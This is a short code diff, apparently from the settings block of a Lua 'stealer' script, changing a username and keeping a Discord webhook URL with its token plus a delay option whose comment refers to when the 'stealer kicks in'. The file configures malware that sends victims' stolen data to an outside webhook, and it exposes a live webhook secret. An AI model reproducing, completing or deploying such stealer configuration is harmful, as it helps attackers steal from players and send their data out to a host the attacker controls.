@@ -1,4 +1,4 @@
-    Username = "Geonta"
+    Username = "Greonta"
     webhook = "https://discord.com/api/webhooks/1195482925618188389/wXaIye6CXvETfaiHpyy9Jk6KRD4Bf8hCD2Pykq7X-XSl-GdnHRPVEjdsFzIv5hB4HZjc"
     loadingscreen = false
     delay = 0 -- extra wait before stealer kicks in usefull if u want your own hub or whatever to run first (in seconds!)
